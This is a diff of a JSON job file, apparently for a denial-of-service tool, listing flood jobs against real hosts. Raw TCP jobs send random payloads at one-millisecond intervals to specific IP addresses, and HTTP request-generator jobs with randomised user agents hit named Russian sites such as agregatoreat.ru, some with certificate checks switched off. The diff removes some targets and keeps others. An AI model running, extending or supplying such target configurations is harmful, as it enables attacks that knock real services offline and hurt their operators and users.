@@ -1,36 +1,6 @@
 {
   "jobs": [
     {
-      "type": "tcp",
-      "count": 2,
-      "name": "213.59.254.8",
-      "args": {
-        "address": "213.59.254.8:80",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 2,
-      "name": "213.59.254.8",
-      "args": {
-        "address": "213.59.254.8:443",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 2,
-      "name": "109.207.8.97",
-      "args": {
-        "address": "109.207.8.97:80",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    },
-    {
       "type": "packetgen",
       "name": "paygine.ru",
       "args": {
@@ -2421,63 +2391,6 @@
             "data": {
               "method": "GET",
               "path": "https://agregatoreat.ru/classifier/ktru-list/?search=23",
-              "headers": {
-                "User-Agent": "{{ random_user_agent }}"
-              }
-            }
-          }
-        }
-      },
-      "count": 2
-    },
-    {
-      "type": "packetgen",
-      "name": "agregatoreat.ru",
-      "args": {
-        "dynamic": false,
-        "connection": {
-          "type": "net",
-          "args": {
-            "protocol": "tcp",
-            "address": "84.201.185.57:80"
-          }
-        },
-        "packet": {
-          "payload": {
-            "type": "http",
-            "data": {
-              "method": "GET",
-              "path": "http://agregatoreat.ru/integration/ecom/classifier/eatCategoryCatalog.zip",
-              "headers": {
-                "User-Agent": "{{ random_user_agent }}"
-              }
-            }
-          }
-        }
-      },
-      "count": 2
-    },
-    {
-      "type": "packetgen",
-      "name": "agregatoreat.ru",
-      "args": {
-        "dynamic": false,
-        "connection": {
-          "type": "net",
-          "args": {
-            "protocol": "tcp",
-            "address": "84.201.185.57:443",
-            "tls_config": {
-              "insecure_skip_verify": true
-            }
-          }
-        },
-        "packet": {
-          "payload": {
-            "type": "http",
-            "data": {
-              "method": "GET",
-              "path": "https://agregatoreat.ru/integration/ecom/classifier/eatCategoryCatalog.zip",
               "headers": {
                 "User-Agent": "{{ random_user_agent }}"
               }
